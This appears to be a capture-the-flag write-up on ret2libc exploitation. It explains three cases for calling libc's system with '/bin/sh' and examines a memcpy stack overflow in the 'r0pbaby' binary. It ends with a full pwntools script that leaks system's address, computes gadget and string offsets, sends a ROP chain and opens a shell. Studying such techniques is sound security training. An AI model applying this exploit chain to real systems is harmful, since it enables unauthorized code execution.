# re2libc
ret2libc means controlling the program to execute functions in the libc library, usually returning to the PLT of some function or to the function's specific location (i.e., the content of the function's GOT entry)
There are the following three cases

 - The program has both system and /bin/sh, or in other words, the address of the system function and the address of the string /bin/sh can be found in the provided executable file
 **In this case, simply construct the arguments and call the function**
-  The program only has system, or in other words, the address of the system function can be found in the provided executable file, but the address of the string /bin/sh cannot be found.
 **In this case, you need to leak the address of some writable input location, first use an input function to input /bin/sh, then construct the arguments, and finally call system**
- The program has neither system nor /bin/sh, or in other words, neither the address of the system function nor the address of the string /bin/sh can be found in the provided executable file.
 **In this case, you first need to leak the address of some function in libc, then obtain the libc base address from the offset, then compute the address of the system function and the address of the string /bin/sh in libc, and finally call it**

## Source Code

> 1. dlopen loads the specified dynamic library into the current process in a specific way and returns a usable handle for subsequent operations such as obtaining function addresses;

>2. dlsym obtains the specified function (the second argument is the function name) from the specified library (specified by the return value of dlopen);

>3. dlclose can close and unload a dynamic library; note that it actually decrements a reference (ref) to the dynamic library, and the unload operation is only triggered when the count reaches 0;

>4. dlerror returns a string describing the error;

>The usual three-step pattern is: first open (dlopen), then obtain the needed function (dlsym), then call the function, and finally close (dlclose)


>The C library function void (*signal(int sig, void (*func)(int)))(int) sets up a function to handle a signal, i.e., a signal handler with the sig parameter. When signal handling occurs, the function corresponding to func is called

This function has three features
1. Get the base address where libc is loaded
2. Get the address of a function in libc
3. Input content onto the stack

> The C library function void *memcpy(void *str1, const void *str2, size_t n) copies n bytes from memory area str2 to memory area str1.

Note that nptr is the starting address of the input content, while &savedregs, as the name suggests — and as you can verify in IDA — is the location on the stack where rbp is saved, and v7 is the length of the input. An overflow exists here: after memcpy, the copied value may reach the return address

from pwn import *
context(os="linux",arch="amd64",log_level="debug")
r=process("./r0pbaby")
#gdb.attach(r,"b*main")
def get_sys_addr():
    r.recvuntil(b"4) Exit")
    r.recvuntil(b": ")
    r.sendline(b"2")
    r.sendlineafter(b"Enter symbol: ",b"system")
    r.recvuntil(b"Symbol system: ")
    system_addr=r.recvuntil(b"\n")[:-1]
    return system_addr

def send_payload(payload):
    r.recvuntil(b"4) Exit")
    r.recvuntil(b": ")
    r.sendline(b"3")
    r.sendlineafter(b"Enter bytes to send (max 1024): ",str(len(payload)))

    r.sendline(payload)
    

system_addr=int(get_sys_addr(),16)
ret_addr=system_addr-162871
print("system_addr",hex(system_addr))
binsh_addr=system_addr+1603848
pop_rdi_addr=system_addr-158091
payload=b"a"*8+p64(pop_rdi_addr)+p64(binsh_addr)+p64(ret_addr)+p64(system_addr)
print(len(payload))
send_payload(payload)
r.interactive()
